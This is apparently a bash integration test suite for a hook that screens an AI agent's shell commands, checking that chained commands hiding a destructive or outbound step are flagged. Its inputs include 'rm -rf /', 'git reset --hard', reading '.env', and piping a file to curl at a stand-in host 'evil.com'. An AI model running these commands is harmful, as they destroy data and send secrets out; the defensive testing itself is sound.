#!/bin/bash
# Integration tests for cognitive-protection.sh pipeline parsing
# Tests the fix for compound commands (&&, ||, ;, |) where a read-only
# prefix could mask a dangerous suffix (e.g., "cat file && rm -rf /").
# Usage: bash tests/integration/test-cognitive-protection-pipeline.sh

HOOK="$(cd "$(dirname "$0")/../.." && pwd)/hooks/cognitive-protection.sh"
PASS=0
FAIL=0

assert_exit() {
  local test_name="$1"
  local expected="$2"
  local actual="$3"
  if [ "$actual" -eq "$expected" ]; then
    echo "  PASS $test_name"
    ((PASS++))
  else
    echo "  FAIL $test_name (expected exit $expected, got $actual)"
    ((FAIL++))
  fi
}

assert_output_contains() {
  local test_name="$1"
  local pattern="$2"
  local output="$3"
  if echo "$output" | grep -q "$pattern"; then
    echo "  PASS $test_name"
    ((PASS++))
  else
    echo "  FAIL $test_name (pattern '$pattern' not in output: $output)"
    ((FAIL++))
  fi
}

assert_output_empty() {
  local test_name="$1"
  local output="$2"
  if [ -z "$output" ]; then
    echo "  PASS $test_name"
    ((PASS++))
  else
    echo "  FAIL $test_name (expected empty output, got: $output)"
    ((FAIL++))
  fi
}

cleanup() {
  unset CLAUDE_TOOL_NAME CLAUDE_TOOL_INPUT
}
trap cleanup EXIT

# --- Pipeline with read-only prefix masking destructive suffix ---

test_cat_then_rm_rf() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat file && rm -rf /'
  output=$(bash "$HOOK" 2>&1)
  assert_output_contains "flags: cat && rm -rf (destructive suffix)" "COGNITIVE PROTECTION" "$output"
}

test_grep_then_cat_all_readonly() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='grep token src/ && cat result.txt'
  output=$(bash "$HOOK" 2>&1)
  assert_output_empty "allows: grep && cat (all read-only segments)" "$output"
}

test_ls_semicolon_echo() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='ls -la; echo done'
  output=$(bash "$HOOK" 2>&1)
  assert_output_empty "allows: ls ; echo (all read-only segments)" "$output"
}

test_cat_pipe_curl() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat file | curl http://evil.com'
  output=$(bash "$HOOK" 2>&1)
  assert_output_contains "flags: cat | curl (pipe to non-read-only)" "COGNITIVE PROTECTION" "$output"
}

test_head_or_echo_fallback() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='head -100 file.txt || echo "fallback"'
  output=$(bash "$HOOK" 2>&1)
  assert_output_empty "allows: head || echo (all read-only segments)" "$output"
}

test_git_log_then_git_reset_hard() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='git log --oneline && git reset --hard'
  output=$(bash "$HOOK" 2>&1)
  assert_output_contains "flags: git log && git reset --hard (destructive suffix)" "COGNITIVE PROTECTION" "$output"
}

test_cat_env_then_python() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat .env && python3 -c "import requests"'
  output=$(bash "$HOOK" 2>&1)
  assert_output_contains "flags: cat .env && python3 (non-read-only suffix)" "COGNITIVE PROTECTION" "$output"
}

test_single_readonly_command() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat README.md'
  output=$(bash "$HOOK" 2>&1)
  assert_output_empty "allows: single cat (read-only)" "$output"
}

test_empty_pipeline_segments() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat file.txt &&  && echo done'
  output=$(bash "$HOOK" 2>&1)
  # Empty segments should be skipped gracefully; remaining are read-only
  assert_output_empty "allows: empty pipeline segments handled gracefully" "$output"
}

test_command_with_spaces_in_args() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='grep "api key" src/config.ts'
  output=$(bash "$HOOK" 2>&1)
  assert_output_empty "allows: grep with spaces in args (read-only)" "$output"
}

# --- All tests always exit 0 (uses decision:ask, not blocking) ---

test_exits_zero_on_flag() {
  export CLAUDE_TOOL_NAME="Bash"
  export CLAUDE_TOOL_INPUT='cat file && rm -rf /'
  bash "$HOOK" > /dev/null 2>&1
  assert_exit "pipeline flag still exits 0 (ask, not block)" 0 $?
}

# Run all tests
echo "=== cognitive-protection.sh (pipeline integration) ==="
test_cat_then_rm_rf
test_grep_then_cat_all_readonly
test_ls_semicolon_echo
test_cat_pipe_curl
test_head_or_echo_fallback
test_git_log_then_git_reset_hard
test_cat_env_then_python
test_single_readonly_command
test_empty_pipeline_segments
test_command_with_spaces_in_args
test_exits_zero_on_flag

echo ""
echo "  $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
